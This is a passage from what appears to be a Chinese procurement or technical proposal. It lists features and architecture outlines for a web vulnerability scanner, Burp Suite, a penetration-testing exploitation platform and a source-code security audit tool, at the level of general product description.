title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>该工具信息如下：</p><p>品牌：国利</p><p>型号：GLwebscncw</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>该工具设计了灵活可扩展的部署方式，以适应不同规模和需求的组织。它允许组织全面管理其所有应用程序的安全性，确保从开发到上线的每一个阶段都得到充分的安全保护。安全团队和开发团队可以利用这个工具紧密协作，共同建立全面的安全策略，确保安全措施与应用程序的发展同步。此外，工具支持在整个应用程序生命周期中进行持续的安全测试和策略扩展，这样不仅提升了应用程序的安全性，也加强了团队之间的协作和沟通，帮助组织在快速变化的安全环境中保持应用程序的安全性和可靠性；</li><li>此工具提供了安全测试自动化功能，对入职审计活动实施完全控制，确保了安全合规性和高效管理。具备安全测试自动化功能，以减少手动测试的需求，提高测试效率。提供对入职和审计活动的完全控制，确保测试过程的准确性和可靠性。这有助于确保测试结果的一致性和准确性，降低人为错误的风险。</li><li>该工具支持展示已识别漏洞引发的安全风险，同时评估法规遵从性风险，以优化防护策略。能够识别web应用程序中的漏洞，并准确地显示这些漏洞可能带来的安全和法规遵从性风险。通过提供详细的漏洞信息和风险评估，工具可以帮助组织更好地了解其应用程序的安全状况，并采取适当的措施进行修复和改进。</li><li>该工具支持使用性能度量指标来直观演示扫描进度，提高效率。提供性能度量功能，以量化测试进度和结果。通过性能度量，组织可以更好地了解测试过程的效率和效果，并根据度量结果调整测试策略和优化工作流程。这有助于提高测试的效率和准确性，确保web应用程序的安全性。</li><li>该工具允许用户根据自定义策略评估潜在风险，增强安全性。允许用户根据组织的特定需求和安全标准自定义测试策略。通过自定义策略，用户可以根据应用程序的特点和风险因素制定更加精确的测试计划，提高测试的针对性和有效性。这有助于满足组织对不同web应用程序的安全要求，并提供更加灵活的测试解决方案。</li><li>提供license，包含数据库在内的功能。。升级服务也可以帮助用户减少潜在的安全风险和漏洞利用的可能性。</li></ol><h4 id="技术实现内容-56"><a href="#技术实现内容-56" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-18"><a href="#软件方案-18" class="headerlink" title="软件方案"></a>软件方案</h5><p>1. 架构设计</p><p>模块化和微服务架构：工具设计为一系列独立但协作的微服务，每个服务负责一个特定的功能，如扫描引擎、结果分析、用户界面、数据库管理等。这样的架构支持可扩展性和容错性。</p><p>容器化部署：使用Docker容器封装各个微服务，支持在各种环境中的一致性部署，同时利用Kubernetes进行容器编排，以实现自动化的伸缩和管理。</p><p>API网关：设计API网关作为微服务和外部请求之间的中介，提供安全的访问控制、流量管理和服务聚合。</p><p>2. 安全测试自动化</p><p>集成和插件系统：提供与常见CI/CD工具的插件，如Jenkins、Travis CI、GitLab CI等，以便于在软件开发生命周期中自动触发安全扫描。</p><p>调度器：用于计划和执行定期扫描任务，并支持对扫描活动的全面控制。</p><p>审计追踪：用于记录所有用户操作和系统事件，确保满足入职和审计要求。</p><p>3. 风险和合规性展示</p><p>漏洞数据库和风险评估引擎：集成公开的漏洞数据库，并开发一个风险评估引擎，用于分析漏洞数据和生成风险评分。</p><p>报告生成器：报告生成器，用于创建定制化的安全报告，这些报告应该包含风险评估结果和合规性状态。</p><p>4. 性能度量</p><p>KPI仪表盘：仪表盘，展示关键性能指标，如漏洞发现率、修复率等，以便用户可以实时监控安全测试的进度和效果。</p><p>数据分析模块：用于处理扫描结果数据，并提供趋势分析和预测。</p><p>5. 自定义策略和风险管理</p><p>策略引擎：允许用户定义和管理自己的扫描策略和风险偏好。</p><p>风险管理工作区：让用户可以设置风险阈值、分类漏洞并指定修复的优先级。</p><p>6. 用户界面和体验</p><p>式Web前端：使用现代前端框架（如React或Angular）开发的Web应用，用户可以在不同的设备上使用工具。</p><p>用户体验（UX）设计：用户界面简洁、直观，减少学习曲线，提供清晰的导航和操作流程。</p><p>7. 数据存储和管理</p><p>数据库选择：采用适合大量数据读写和查询的数据库系统。</p><p>数据加密和备份：确保所有敏感数据都经过加密，提供数据备份和恢复的机制。</p><h5 id="工具功能-18"><a href="#工具功能-18" class="headerlink" title="工具功能"></a>工具功能</h5><p>可扩展部署方式：工具提供灵活的部署选项，包括单机部署、分布式部署以及云服务集成。工具支持容器化部署，如Docker和Kubernetes，以及与DevOps工具链的无缝集成，如Jenkins和GitLab CI。支持在CI/CD流程中嵌入安全测试，实现DevSecOps的目标。工具提供API接口，允许团队在不同的开发和生产环境中部署和管理扫描任务，以及策略的制定和更新。</p><p>安全测试自动化：该工具支持全面的自动化测试，允许用户创建和调度定制的扫描任务，并且能够集成到代码和部署的自动化流程中。此外，工具提供对入职和审计活动的详细记录和完全控制，包括用户操作日志、扫描历史以及更改审计。帮助组织满足合规性要求，并提供必要的文档以支持审计过程。</p><p>风险展示：工具能够清晰地展示由于漏洞而产生的安全风险和潜在的法规遵从性问题。工具支持将漏洞信息与公开的安全漏洞数据库进行对比，并根据漏洞的严重性、影响范围和修复难度等因素计算风险评分。此外，工具提供易于理解的风险报告，以便非技术利益相关者也能理解风险的严重性。</p><p>性能度量：工具提供性能度量仪表盘，用于追踪和展示安全测试的进度和效果。包括漏洞发现率、修复率、测试覆盖率等关键性能指标（KPIs）。可以监控安全测试的效果，并在需要时进行策略调整。</p><p>自定义策略风险：组织能够根据自己的安全需求和风险承受能力定制扫描策略。工具允许用户定义哪些漏洞类型是可接受的风险，哪些需要立即修复。用户能够设置不同的风险等级和相应的措施，并且这些策略可以随着组织安全需求的变化而灵活调整。</p><h3 id="集成渗透测试工具"><a href="#集成渗透测试工具" class="headerlink" title="集成渗透测试工具"></a>集成渗透测试工具</h3><h4 id="工具概述-15"><a href="#工具概述-15" class="headerlink" title="工具概述"></a>工具概述</h4><p>用于攻击web 应用程序的集成平台，包含了许多工具。为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h4 id="功能实施方案-64"><a href="#功能实施方案-64" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该工具信息如下：</p><p>品牌：PortSwigger Web Security</p><p>型号：Burp Suite</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>该工具集成了渗透测试功能，能够识别和评估包括SQL注入、跨站脚本XSS在内的100项通用网络安全漏洞，提供全面的安全检查以及详尽的报告，帮助企业有效防范网络攻击，确保信息系统的安全性。</li><li>本工具针对渗透测试提供了强化的Web应用程序爬虫功能，支持对JavaScript进行深入的静态分析和动态分析，能够有效地识别客户端运行时的安全漏洞，从而为开发者和安全专家提供全面的安全评估。</li><li>该工具集成了渗透测试能力，特别支持检测服务器端漏洞，能够精准识别和评估诸如SQL注入、路径遍历等安全威胁，确保服务器的稳固安全。</li><li>本工具在集成渗透测试方面表现卓越，支持检测目标应用程序，尤其在执行到达潜在危险API的操作时，它能够提供即时反馈，帮助开发者识别和修复可能的安全漏洞，确保应用程序的安全性和稳定性。</li><li>这款渗透测试工具具备强大的内容发现功能，能够有效挖掘和揭示Web应用中不易察觉的隐藏内容和功能，比如被遗忘的管理接口或未公开的敏感目录，从而为安全评估提供更全面的视角。</li><li>该渗透测试工具展示了一项实用功能，支持显示静态和动态URL的数量，同时详细列出了每个URL所占用的参数数量，这为安全分析师提供了深入理解目标应用程序结构的关键数据，助力精准识别潜在的安全风险点。</li><li>这款工具的代理功能不仅高效，还支持用户定义匹配和替换规则，使得安全专家可以自动对经过代理的HTTP请求和进行定制化的修改，极大地增强了渗透测试的灵活性和针对性，从而在安全测试过程中实现更精确的攻击模拟和漏洞诊断。</li><li>该渗透测试工具提供了支持伪造代理证书的功能，可以在测试过程中创建并使用伪造的SSL证书，支撑用户开展相应的测试。</li><li>该工具的渗透测试功能中包含了一项先进的随机性加密测试，它能够对会话令牌进行统计分析，通过标准化的方法评估令牌的随机性质量，确保会话令牌不易被预测，从而为Web应用提供更为坚固的安全防护。</li><li>该工具支持攻击者通过将恶意内容覆盖在合法的网页上，诱使用户在不知情的情况下执行恶意操作，从而获取用户的敏感信息或执行恶意操作，进行点击劫持攻击检测，能有效识别并预防此类安全威胁。</li><li>本工具支持通过代理捕获网络流量，并提供所有请求和的完整详细信息展示，使安全分析师能够深入了解和审查每一个数据包。</li><li>提供license，包含数据库在内的功能。。产品白皮书见“产品白皮书”部分。</li></ol><h4 id="技术实现内容-57"><a href="#技术实现内容-57" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-19"><a href="#软件方案-19" class="headerlink" title="软件方案"></a>软件方案</h5><p>漏洞扫描模块：配置面板：允许用户选择漏洞扫描类型、设置扫描深度等。结果面板：显示扫描结果，按照风险级别分类并提供详细报告。</p><p>Web爬虫与分析模块：爬虫设置：用于配置爬虫的行为，如速度、深度等。分析选项：允许用户选择静态或动态分析，以及相关设置。结果展示：图形化展示爬取的网站结构和分析结果。</p><p>服务器端漏洞检测模块：扫描配置：设置目标服务器、认证信息、扫描类型等。检测报告：展示服务器漏洞检测结果和修复建议。</p><p>API监控模块：监控规则设置：定义API监控的白名单/黑名单和通知规则。监控结果：显示API调用监控数据和安全事件。</p><p>内容发现模块：发现设置：配置字典、路径规则、过滤等。发现结果：列出发现的隐藏内容和链接。</p><p>URL分析模块：分析设置：定义URL分析的深度和重要性评分。URL列表：展示静态和动态URL及其参数详情。</p><p>请求/拦截与重写模块：规则配置：用户可以定义请求和的匹配和替换规则。历史记录：显示已拦截和重写的请求/历史。</p><p>SSL代理模块：证书配置：生成和管理伪造的SSL证书。代理设置：配置代理行为和加密算法。</p><p>会话令牌分析模块：分析选项：选择测试样本大小和统计方法。分析结果：图形和报告显示令牌随机性分析。</p><p>点击劫持攻击模块：测试配置：设置框架检测策略和劫持技术。测试结果：显示是否容易受到点击劫持攻击。</p><p>代理流量分析模块：流量监控：实时监控请求和的详细信息。数据过滤：根据用户需求过滤和搜索特定的流量数据。</p><h5 id="工具功能-19"><a href="#工具功能-19" class="headerlink" title="工具功能"></a>工具功能</h5><p>漏洞扫描：支持检测至少100项通用漏洞，包括但不限于SQL注入、跨站脚本（XSS）、命令注入、文件上传漏洞等。参数将包括漏洞扫描深度设置、漏洞类型选择、自定义扫描规则，以及漏洞影响级别评估。</p><p>Web爬虫与分析：支持高效的Web应用程序爬虫，对网站结构进行全面映射。同时，对JavaScript的静态和动态分析能力将帮助识别客户端运行时的安全问题。参数设置将包括爬虫速度、爬取深度、排除规则、以及动态执行超时设置。</p><p>服务器端漏洞检测：对检测服务器配置错误、服务版本漏洞等服务器端安全问题进行检测。允许用户指定扫描范围、认证信息、以及检测精度等。</p><p>API监控：监控目标应用程序的API调用，特别是那些可能导致安全风险的敏感API。包括API白名单/黑名单设置、风险级别通知、以及自定义API行为分析规则。</p><p>内容发现：帮助用户发现和映射Web应用中的隐藏内容和功能。参数包括字典设置、路径排除、代码过滤、以及内容优先级标记。</p><p>URL分析：展示静态和动态URL的数量，以及它们的参数详情。参数设置包括URL统计显示选项、参数分析深度、以及URL重要性评分。</p><p>请求/拦截与重写：允许用户定义匹配和替换规则，自动对通过代理的请求和进行修改。参数包括规则定义、应用范围、以及规则优先级设置。</p><p>SSL代理：支持伪造代理证书，以便在HTTPS流量中进行中间人攻击。参数包括证书生成设置、加密算法选择、以及证书有效期设置。</p><p>会话令牌分析：使用标准的随机性测试来对会话令牌进行统计分析，以识别潜在的会话固定和会话预测漏洞。参数包括测试样本大小、统计方法选择、以及分析报告详细程度。</p><p>点击劫持攻击：支持测试目标网站是否容易受到点击劫持攻击。参数包括框架检测策略、劫持技术选择、以及用户交互模拟。</p><p>代理流量分析：提供通过代理的所有请求和的详细信息，包括HTTP头部、会话数据、以及变化跟踪。参数包括数据过滤选项、高亮显示设置、以及流量记录级别。</p><h4 id="产品白皮书"><a href="#产品白皮书" class="headerlink" title="产品白皮书"></a>产品白皮书</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/46bfe2c52328c83ec2ef142d8ed9111d.jpeg" alt="Burp Suite_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/183f25940f140ee5cac4289e154026e7.jpeg" alt="Burp Suite_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b8e06ac2e45b58b55c3e106966ec2af0.jpeg" alt="Burp Suite_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e36f5ff62fcb3e72092e0eb8f4d4501f.jpeg" alt="Burp Suite_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/21f5863cb60ff1b4599f396b0d5d27f7.jpeg" alt="Burp Suite_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9da64ae454a33302f01297e1cd6c8d9a.jpeg" alt="Burp Suite_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ff765cebe103d59fd7fd961f77639931.jpeg" alt="Burp Suite_06"></p><h3 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h3><h4 id="工具概述-16"><a href="#工具概述-16" class="headerlink" title="工具概述"></a>工具概述</h4><p>安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。可为渗透测试全过程提供专业的技术支持：</p><p>渗透前期：提供信息收集能力，包括：子域名发现、目录扫描、指纹识别、邮箱收集、敏感信息泄露收集等功能；</p><p>渗透中期：提供针对目标的漏洞发现和利用功能和社会工程学攻击功能；</p><p>渗透后期：提供进入内网之后的横向渗透等功能。</p><h4 id="功能实施方案-65"><a href="#功能实施方案-65" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>该工具支持自动进行深度安全测试评估，覆盖渗透测试的关键步骤。从信息收集到漏洞扫描，再到漏洞利用及权限提升，直至最后的证据收集，每一环节都能实现自动化处理。这样的设计极大地提高了测试的效率和准确性，同时也降低了安全专家的工作负担。通过这种自动化渗透测试，工具不仅能快速识别出系统的安全漏洞，还能在一定程度上模拟黑客的攻击路径。</li><li>本工具支持多用户登录功能，各用户可以根据权限自行使用其相关功能，一般用户可通过直观的Web界面进行操作，而高级用户则可选择使用命令行进行更复杂的操作和配置。</li><li>该渗透测试工具内置了丰富的漏洞攻击利用模块，数量达到了1600个，覆盖了各类已知安全漏洞，供用户开展各种测试活动。</li><li>这款工具具备横向扩展能力，支持通过代理跳板和VPN跳板式攻击，使得安全专家可以利用一台已经渗透成功的机器作为跳板，从而在同一网络段内对其他主机或设备进行进一步的渗透测试，极大地提高了渗透测试的效率和效果。</li><li>这款先进的渗透测试工具支持虚拟机部署方式，它可以灵活适应各种不同的测试环境。无论是在云基础设施中，还是在硬件服务器中，甚至是在便携式笔记本上，都可以快速部署，为安全专家提供了极大的便利，确保在任何环境下都能高效地进行安全漏洞的评估和利用测试。</li><li>提供license，包含数据库在内的功能。。</li></ol><h4 id="技术实现内容-58"><a href="#技术实现内容-58" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-20"><a href="#软件方案-20" class="headerlink" title="软件方案"></a>软件方案</h5><p>中央管理服务器：负责用户管理、任务管理和结果收集等功能。提供Web界面和命令行接口供用户操作。</p><p>多用户支持与操作界面：工具将支持多用户操作，满足不同用户的需求：Web界面：为一般用户提供图形化操作界面，简化渗透测试的复杂性。命令行界面：为高级用户提供命令行工具，以便于执行更复杂的定制化操作。</p><p>任务调度：允许用户设置定时任务，以自动执行渗透测试。</p><p>结果报告：提供详细的测试报告，包括漏洞详情、利用过程和测试结果。</p><p>模块更新：支持在线更新漏洞利用模块，以便及时新出现的漏洞。</p><p>用户管理：允许管理员对用户权限进行管理，确保测试工作的安全性和有效性。</p><h5 id="工具功能-20"><a href="#工具功能-20" class="headerlink" title="工具功能"></a>工具功能</h5><p>信息收集评估：自动化收集目标系统的网络信息、服务信息、操作系统详情等。</p><p>漏洞扫描评估：快速识别目标系统的已知漏洞，使用数据库中的漏洞签名进行匹配。</p><p>漏洞利用测试：针对扫描到的漏洞，自动尝试多种利用技术，以实现对系统的渗透。</p><p>权限提升测试：在渗透成功后，自动尝试多种方法提升权限，获取更深层次的系统访问能力。</p><p>证据收集：自动化搜集系统漏洞利用后的证据，如系统用户信息、敏感文件等。</p><p>多用户支持与操作界面：工具支持多用户操作，满足不同用户的需求：Web界面：为一般用户提供图形化操作界面，简化渗透测试的复杂性。命令行界面：为高级用户提供命令行工具，以便于执行更复杂的定制化操作。</p><p>漏洞攻击利用模块：工具将集成超过1600个漏洞利用模块，涵盖各种操作系统、应用程序和网络设备的已知漏洞，确保能够对最新的安全威胁做出。</p><p>横向扩展能力：工具支持通过代理和VPN进行跳板式攻击，使得用户可以利用已经渗透的机器作为跳板，进一步攻击同一网络中的其他目标。</p><p>多环境部署支持：工具支持在虚拟化环境、便携式笔记本以及硬件服务器上部署，确保渗透测试工作可以在各种条件下顺利进行。</p><h3 id="源代码安全审计工具"><a href="#源代码安全审计工具" class="headerlink" title="源代码安全审计工具"></a>源代码安全审计工具</h3><h4 id="工具概述-17"><a href="#工具概述-17" class="headerlink" title="工具概述"></a>工具概述</h4><p>为解决智能网联汽车软件功能在源代码安全检测方面遇到的问题，提供了一套企业级源代码缺陷分析、源代码缺陷审计、源代码缺陷修复跟踪的解决方案。</p><h4 id="功能实施方案-66"><a href="#功能实施方案-66" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>提供对广泛编程语言的支持，覆盖了从传统的C/C++、COBOL到现代的Swift、Kotlin以及Web开发常用的JavaScript、JSP、HTML等，确保了几乎所有主流开发语言的安全性能够得到检测。它还包括对配置文件如XML、Yaml、VM和Config的审查，以及对ASP.NET、Scala、Ruby、GO、SQL、NodeJS、Pythyon、PHP、JAVA、C#、bjective-C、和Shell脚本的分析，即完全覆盖C/C++、Objective-C、Swift、C#、Java、PHP、Python、COBOL、NodeJS、SQL、GO、Kotlin、Ruby、Scala、 XML、Yaml、JavaScript、JSP、HTML、VM、Config、ASP.NET、Shell，MISRA C规则检测。此外，该工具遵循严格的MISRA C规则检测，包含了2012版本，以确保嵌入式系统开发的代码安全。能够帮助开发者和安全专家发现并修复潜在的安全漏洞。</li><li>具有直观的用户界面，能够以列表形式展示所有检测任务的状态，包括当前正在进行的检测任务以及已经完成的任务，无论是检测成功还是检测失败的任务都一目了然。这种设计不仅便于用户实时监控和管理检测流程，还能帮助用户快速定位问题，优化后续的审计和修复工作。</li><li>工具提供了一个高级搜索功能，它允许用户根据多个维度进行过滤，包括任务名、检测语言、检测状态、以及检测时间。这样，用户可以快速定位到特定的任务，无论是想要查看某一种语言的检测结果，还是想要找到特定时间段内的检测记录，或是筛选出当前正在进行、已完成成功或失败的任务，这个功能都能提供极大的便利。</li><li>源代码安全审计工具支持用户发起审计任务，在发起任务时可进行任务名称、选择检测语言、检测源码等配置，任务最后即可上传或指定检测源码的路径，以实现针对性的安全检测。</li><li>本源代码安全审计工具具备从远程代码库获取检测代码的功能，全面支持多种版本控制系统。对于Git，它不仅能够从指定的路径中拉取代码，还支持通过分支/tags/commitID来进行代码拉取，这为审计提供了极大的便利。此外，SVN用户也能从其版本库中直接导入代码进行检测。对于Azure DevOps（旧称TFS）用户，该工具同样提供了无缝的集成能力。ClearCase和StarTeam的支持确保了即使是在企业级的复杂环境下，用户也能够轻松地进行代码安全审计。此外，对于不使用版本控制系统的场景，工具同样提供了通过共享目录或FTP服务器获取源代码的能力，确保了其广泛的适用性和灵活性。这些特性使得工具能够满足不同团队和需求，实现高效、全面的安全审计。</li><li>该工具允许用户配置例外文件或文件夹，这些指定的部分将只参与编译过程，而不会被包含在安全检测的范围内，确保了检测的灵活性和精确性。</li><li>该源代码安全审计工具提供了重试机制，支持对检测失败的任务重新发起检测，确保审计的完整性和准确性。</li><li>本工具在源代码安全审计方面，不仅支持删除所选检测任务，还能同时清理与之相关的结果文件，以保持审计环境的整洁和数据的安全。</li><li>该源代码安全审计工具在完成检测后，具备自动化通知功能，能够将检测结果通过邮件的形式发送给代码相关人员，包括代码的创建者和访问者。这一特性极大提升了工作效率，确保了信息的即时传递，让团队成员能够迅速了解安全审计的结果，并采取相应的措施。</li><li>这款工具的设计理念充分考虑了现代软件开发的复杂性，支持将多个工程（源码）根据实际项目情况组合到一个项目中，实现整合管理。这不仅便于持续检测，还能进行详尽的数据统计和趋势分析，从而让开发团队能够及时发现和修复安全漏洞，优化代码质量，保证软件开发的持续性和安全性。</li><li>这款工具为用户提供了创建功能，用户可以轻松配置检测语言以及检测源码等关键信息。通过这种方式，工具允许用户定制化设置，以适应不同的审计需求，确保了安全检测的准确性和高效性。</li><li>该工具的灵活性表现在其支持从多种远程代码库获取检测代码的能力，涵盖了业界广泛使用的版本控制系统。具体来说，它可以从Git仓库中通过指定分支、标签或者ID来拉取代码，同时支持SVN、Azure DevOps（之前称为TFS）、ClearCase、StartTeam等系统。此外，它还能够通过共享目录或FTP服务器获取源码。这些功能确保了不同环境下的代码都能被准确地检索和分析，为源代码安全审计提供了强大的支持。</li><li>这款源代码安全审计工具的设计考虑到了团队合作的需求，因此它支持将任务的查看权限授予指定的个人或整个部门，从而确保了审计工作的协同性和信息的安全性。</li><li>该源代码安全审计工具提供了一个高级功能，允许用户通过定义函数白名单来优化检测过程。当开发者已经通过特定的补丁函数解决了某个安全缺陷时，这个功能可以自动识别并剪裁掉那些通过这些安全函数修复的代码路径。这样做可以显著减少误报，提高审计的准确性和效率，从而使安全团队能够更加专注于未解决的或者新出现的安全问题。</li><li>这款安全审计工具的用户界面设计得非常直观，使得用户可以轻松查看每个检测批次的具体检测情况，包括发现的缺陷和安全问题等详细信息。这样的设计有助于用户快速定位问题，有效提高审计效率。</li><li>该工具提供了功能，使用户能够对比并查看某一检测批次与既定检测目标之间的差距，从而评估安全目标的达成程度，并指导后续的安全改进措施。</li><li>这款工具的强大之处在于它支持查看每个批次的缺陷变化趋势，帮助用户追踪安全漏洞的修复进度和代码质量的持续改进，确保软件开发的安全性。</li><li>该工具提供了一个便捷的功能，允许用户关注特定项目，以便能够快速查看该安全审计状态和详细报告，从而实现对关键持续监控和风险管理。</li><li>这款源代码安全审计工具中，用户可以选择禁用某些项目，而被禁用的项目虽然无法发起新的检测任务，但是用户仍然可以访问和查看这些历史检测数据。这一功能有助于专注于当前活跃的项目，同时保留对已完成或暂停审计记录，以便于未来的回顾和分析。</li><li>该工具在源代码安全审计测试中提供了一个详尽的任务检测概要界面，它不仅展示了任务的基本信息，如任务名称、启动时间和状态，还包括了源代码的详细信息，例如代码版本和更新记录。此外，工具还能统计各编程语言的源码行数，以及问题的分类统计，比如安全漏洞、代码异味和性能问题等，为开发者和安全分析师提供了全面的数据视图，以便快速评估和决策。</li><li>在这款源代码安全审计测试工具中，当检测任务是直接从远程代码仓库发起时，工具能够自动记录并展示详细的代码仓库信息。这包括检测的代码仓库地址、所选用的分支或tags，以及对应的CommitID。此外，工具还能显示代码的者信息，这样的设计使得用户能够轻松追溯每一次检测与特定的代码变更之间的关系，增强了审计的透明度和追踪能力，有助于团队更有效地管理代码安全性。</li><li>该工具在源代码安全审计测试中支持展示检测任务所涉及的依赖库情况，用户可以快速查看并了解项目中使用的各种第三方库及其版本信息，确保依赖管理的透明度和安全性。</li><li>这款工具提供了查看编译日志的功能，使用户能够在进行源代码安全审计测试时，详细检查该检测任务的编译过程，及时发现并处理可能的编译问题。</li><li>该工具的高级特性之一是能够自动识别并合并显示那些具有相同文件路径和爆发行的缺陷，这样的设计大大减少了重复报告的问题，使得安全专家可以更加专注于独特的和关键的安全漏洞，从而提升了审计的效率和准确性。</li><li>本工具在源代码安全审计测试中支持全文检索功能，用户可以对整个代码区的内容进行搜索，包括但不限于函数名称、变量声明以及其他代码元素，从而快速定位到相关代码，加速安全漏洞的识别和修复过程。</li><li>该工具具备强大的路径跟踪功能，它不仅支持以图表形式展示同一分类的缺陷跟踪路径，便于分析人员一目了然地识别最佳修复点，还能够提供单个缺陷的跟踪路径表和图，这样的细粒度展示使得开发和安全团队能够精确理解缺陷产生的上下文，以及如何有效地进行修复，确保代码质量和安全性得到全面提升。</li><li>该工具的优势在于，它不仅能够发现问题，还支持显示具体的修复建议，帮助开发者快速解决安全缺陷。</li><li>本工具提供全面的安全规范支持，能够完全支持CERT、CWE、CWE/SANS TOP 25、GB/T 34943-2017 C/C++、GB/T 34944-2017 Java、GB/T 34946-2017 C#、GJB 5369-2005、GJB 8114-2013、ISO/IEC TR 24772、OWASP Mobile Top 10、OWASP TOP 10、PCI DSS、SJ/T 11682-2017、SJ/T 11683-2017，它不仅遵从国际认可的CERT和CWE标准，还包括CWE/SANS TOP 25和OWASP TOP 10等重要安全威胁模型。此外，它兼容中国国家标准如GB/T 34943-2017针对C/C++的规定、GB/T 34944-2017 Java安全规则、GB/T 34946-2017 C#安全标准，以及军工标准GJB 5369-2005和GJB 8114-2013，同时符合ISO/IEC TR 24772指南。对于移动应用安全，它实现了OWASP Mobile Top 10的检测。工具也支持PCI DSS要求，确保支付系统安全，以及中国电子技术标准化研究院的SJ/T 11682-2017和SJ/T 11683-2017标准，为不同编程语言和应用场景的安全性提供了强有力的保障。</li><li>这款工具具备高级搜索功能，可以根据缺陷名称、分类、当前的审计状态、缺陷所在的文件位置、以及引入缺陷的代码爆发行作者等多个维度进行精确搜索，从而帮助用户快速定位和理解安全漏洞。</li><li>该工具支持按照缺陷的分类和等级等多维度进行筛选，并且能够与第三方Bug跟踪系统集成，实现缺陷的批量，从而优化了缺陷管理流程。</li><li>提供license，包含数据库在内的功能。</li></ol><h4 id="技术实现内容-59"><a href="#技术实现内容-59" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-21"><a href="#软件方案-21" class="headerlink" title="软件方案"></a>软件方案</h5><p>1. 仪表盘</p><p>任务概览：显示当前活跃、成功和失败的检测任务数量。</p><p>项目快速访问：为用户提供关注的项目列表和状态概要。</p><p>趋势分析图表：图形化展示缺陷趋势和检测统计。</p><p>2. 任务管理</p><p>任务列表：以表格形式列出所有任务，包含状态标识。</p><p>任务创建：提供创建新任务的表单，包括配置任务参数。</p><p>任务搜索与过滤：根据任务名、语言、状态等进行搜索。</p><p>任务操作：允许用户重新检测、删除和查看任务详情。</p><p>3. 项目管理</p><p>项目列表：展示所有项目及其相关信息。</p><p>项目创建与配置：提供创建和配置界面。</p><p>项目搜索与过滤：根据项目名、创建者等进行搜索。</p><p>项目状态管理：允许用户关注、禁用和删除项目。</p><p>4. 代码库集成</p><p>集成配置：设置和管理代码库连接，包括认证信息。</p><p>代码拉取：提供从不同代码库拉取代码的选项。</p><p>代码版本信息：展示拉取的代码的版本详情，如CommitID。</p><p>5. 检测配置</p><p>语言选择：允许用户选择需要检测的编程语言。</p><p>规则集选择：用户可以选择MISRA C等规则集。</p><p>例外设置：配置不参与检测的文件或文件夹。</p><p>6. 审计结果</p><p>结果概览：提供任务的检测概要，包括问题分类统计。</p><p>缺陷列表：显示所有检测到的缺陷，并支持排序和筛选。</p><p>缺陷详情：展示缺陷的详细信息，修复建议和跟踪路径。</p><p>结果通知设置：配置结果通知的接收人和邮件模板。</p><p>7. 缺陷管理</p><p>缺陷搜索：按名称、分类、文件等进行缺陷搜索。</p><p>缺陷跟踪：提供缺陷的跟踪路径图和表。</p><p>批量操作：批量缺陷到第三方Bug系统。</p><p>8. 报告与统计</p><p>趋势分析：动态图表显示缺陷趋势和检测效率。</p><p>报告生成：生成和下载详细的审计报告。</p><p>统计数据：提供各种维度的统计数据，如语言行数统计。</p><p>9. 设置与配置</p><p>用户权限管理：设置不同用户和部门的访问权限。</p><p>安全标准配置：选择和配置不同的安全标准。</p><p>通知配置：设定检测完成后的通知方式和内容。</p><p>10. 帮助与支持</p><p>文档中心：提供详细的用户手册和使用指南。</p><p>FAQ：常见问题解答。</p><p>技术支持：联系方式和技术支持请求的表单。</p><h5 id="工具功能-21"><a href="#工具功能-21" class="headerlink" title="工具功能"></a>工具功能</h5><p>多语言支持：工具支持广泛的编程语言，包括但不限于C/C++、Objective-C、Swift、C#、Java、PHP、Python、COBOL、NodeJS、SQL、GO、Kotlin、Ruby、Scala、XML、Yaml、JavaScript、JSP、HTML、VM、Config、ASP.NET、Shell。此外，工具将包括对MISRA C 2012规则的检测，确保对嵌入式系统代码的高标准审计。</p><p>检测任务列表：所有检测任务将以列表形式展示，清晰显示正在检测中、检测成功、检测失败的任务，以便用户实时监控审计进度。</p><p>高级搜索功能：用户可以通过任务名、检测语言、检测状态、检测时间等维度进行高级搜索，快速找到特定的检测任务。</p><p>任务发起与配置：用户可轻松发起检测任务，并配置任务名、检测语言、检测源码等关键信息。</p><p>代码库集成：工具将支持从远程代码库获取检测代码，兼容Git、SVN、Azure 